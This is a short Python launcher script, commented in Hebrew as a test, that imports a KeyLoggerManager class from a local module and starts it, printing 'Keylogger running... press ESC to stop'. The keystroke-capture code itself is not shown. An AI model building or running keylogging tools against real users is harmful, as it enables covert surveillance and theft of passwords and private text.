# בדיקה
from Key_logger_manager import KeyLoggerManager

if __name__ == "__main__":
    print("Keylogger פועל... לחץ על ESC כדי לעצור")
    manager = KeyLoggerManager()
    manager.start()
